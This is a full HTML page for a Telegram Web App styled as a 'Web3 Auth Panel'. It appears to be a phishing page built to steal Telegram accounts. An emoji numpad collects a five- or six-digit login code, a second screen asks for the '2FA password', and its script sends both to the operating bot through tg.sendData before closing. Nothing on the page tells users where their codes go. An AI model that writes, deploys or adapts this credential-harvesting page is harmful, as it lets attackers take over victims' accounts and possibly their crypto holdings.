<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Web3 Auth Panel</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --bg-color: #0f172a;
            --accent-color: #38bdf8;
            --text-color: #f8fafc;
            --key-bg: #1e293b;
        }
        body {
            background-color: var(--bg-color);
            color: var(--text-color);
            font-family: 'Inter', sans-serif;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            width: 90%;
            max-width: 400px;
            text-align: center;
        }
        .display {
            font-size: 2rem;
            margin-bottom: 20px;
            letter-spacing: 5px;
            height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: var(--key-bg);
            border-radius: 12px;
            border: 1px solid var(--accent-color);
            box-shadow: 0 0 15px rgba(56, 189, 248, 0.2);
        }
        .numpad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            width: 100%;
        }
        .key {
            background: var(--key-bg);
            border: 1px solid #334155;
            padding: 20px;
            font-size: 1.5rem;
            border-radius: 12px;
            color: white;
            cursor: pointer;
            transition: 0.2s;
        }
        .key:active {
            background: var(--accent-color);
            transform: scale(0.95);
        }
        .key.submit {
            grid-column: span 2;
            background: var(--accent-color);
            color: var(--bg-color);
            font-weight: bold;
        }
        input[type="password"] {
            width: 100%;
            padding: 15px;
            background: var(--key-bg);
            border: 1px solid var(--accent-color);
            border-radius: 12px;
            color: white;
            font-size: 1.2rem;
            margin-bottom: 20px;
            box-sizing: border-box;
            text-align: center;
        }
        .hidden { display: none; }
        h2 { color: var(--accent-color); font-weight: 300; }
    </style>
</head>
<body>

    <div class="container" id="code-screen">
        <h2 id="title">Вход в систему</h2>
        <div id="display-text" class="display"></div>
        <div class="numpad">
            <button class="key" onclick="addNum('1')">1️⃣</button>
            <button class="key" onclick="addNum('2')">2️⃣</button>
            <button class="key" onclick="addNum('3')">3️⃣</button>
            <button class="key" onclick="addNum('4')">4️⃣</button>
            <button class="key" onclick="addNum('5')">5️⃣</button>
            <button class="key" onclick="addNum('6')">6️⃣</button>
            <button class="key" onclick="addNum('7')">7️⃣</button>
            <button class="key" onclick="addNum('8')">8️⃣</button>
            <button class="key" onclick="addNum('9')">9️⃣</button>
            <button class="key" onclick="clearNum()">❌</button>
            <button class="key" onclick="addNum('0')">0️⃣</button>
            <button class="key submit" onclick="submitData()">ОТПРАВИТЬ</button>
        </div>
    </div>

    <div class="container hidden" id="password-screen">
        <h2>2FA Пароль</h2>
        <input type="password" id="pass-input" placeholder="Введите пароль">
        <button class="key submit" style="width: 100%" onclick="submitPass()">ПОДТВЕРДИТЬ</button>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        let currentInput = "";
        const urlParams = new URLSearchParams(window.location.search);
        const mode = urlParams.get('mode'); // 'code' или 'password'

        if (mode === 'password') {
            document.getElementById('code-screen').classList.add('hidden');
            document.getElementById('password-screen').classList.remove('hidden');
        }

        function addNum(n) {
            if (currentInput.length < 6) {
                currentInput += n;
                updateDisplay();
            }
        }

        function clearNum() {
            currentInput = "";
            updateDisplay();
        }

        function updateDisplay() {
            // Маппинг цифр в эмодзи для визуала
            const emojis = {"1":"1️⃣","2":"2️⃣","3":"3️⃣","4":"4️⃣","5":"5️⃣","6":"6️⃣","7":"7️⃣","8":"8️⃣","9":"9️⃣","0":"0️⃣"};
            document.getElementById('display-text').innerText = 
                currentInput.split('').map(char => emojis[char]).join('');
        }

        function submitData() {
            if (currentInput.length < 5) {
                tg.showAlert("Код слишком короткий!");
                return;
            }
            tg.sendData(JSON.stringify({type: "code", value: currentInput}));
            tg.close();
        }

        function submitPass() {
            const pass = document.getElementById('pass-input').value;
            if (pass.length < 1) return;
            tg.sendData(JSON.stringify({type: "password", value: pass}));
            tg.close();
        }
    </script>
</body>
</html>
